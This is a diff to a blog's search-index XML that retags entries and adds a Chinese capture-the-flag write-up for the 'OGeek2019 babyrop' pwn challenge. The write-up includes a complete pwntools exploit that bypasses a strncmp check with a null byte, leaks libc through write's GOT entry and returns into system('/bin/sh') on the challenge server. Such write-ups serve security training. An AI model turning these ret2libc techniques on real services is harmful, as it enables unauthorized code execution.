@@ -355,7 +355,7 @@
 <p><strong>参考链接</strong>：<a href="https://blog.csdn.net/fjh1997/article/details/107695261">关于jarvisOJ level0远程打得通本地打不通的问题_fjh1997的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
-        <category>buuctf</category>
+        <category>buu</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -745,7 +745,6 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>other</tag>
         <tag>64位ret2libc</tag>
       </tags>
   </entry>
@@ -774,6 +773,39 @@
       </categories>
       <tags>
         <tag>32位格式化字符串</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OGeek2019 babyrop</title>
+    <url>/2021/10/10/OGeek2019%20babyrop/</url>
+    <content><![CDATA[<p>checksec </p>
+<p>![](OGeek2019 babyrop.assets/image-20211021235625510.png)</p>
+<p>ida</p>
+<p>![](OGeek2019 babyrop.assets/image-20211022001224677.png)</p>
+<p>sub函数看看</p>
+<p>![](OGeek2019 babyrop.assets/image-20211022002155033.png)</p>
+<p>v5读入一个buf，而v1为buf的长度，然后一个strncmp函数</p>
+<p>![](OGeek2019 babyrop.assets/image-20211022002313426.png)</p>
+<p>它是逐个字节进行比较的，而这里我们要让他直接停止比较，使得v1等于0 ，故往buf中写入\0。</p>
+<p>接下来是这个</p>
+<p>![](OGeek2019 babyrop.assets/image-20211022002756780.png)</p>
+<p>这边传进来的参数，是前面buf中最后一个字节的int值。而这里要从e7开始溢出，故只能用else中的read函数，所以buf中最后一个字节要尽可能的大。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#32位程序，先用\0终止strlen函数，之后用Ret2libc得到sys与binsh地址</span></span><br><span class="line"><span class="comment">#用write_plt泄露write的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29773</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn9&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn9&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">sub_080487D0 = <span class="number">0x080487D0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span> + p32(<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xE7</span> + <span class="number">4</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(sub_080487D0) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr)) </span><br><span class="line">libcbase = write_addr -<span class="number">0x0d43c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase:&#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase +<span class="number">0x03a940</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment">#libcbase= write_addr -libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = offset * <span class="string">b&#x27;A&#x27;</span> + p32(sys_addr)+ p32(<span class="number">0</span>)  + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这边用远程libcsearcher找不到合适的动态链接库，所以只好手动打了。</p>
+<p>总结：</p>
+<ul>
+<li>32位ret2libc</li>
+<li>注意绕过题目中一些限制条件，这边用的绕过strlen。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>buu</category>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>32位ret2libc</tag>
       </tags>
   </entry>
 </search>
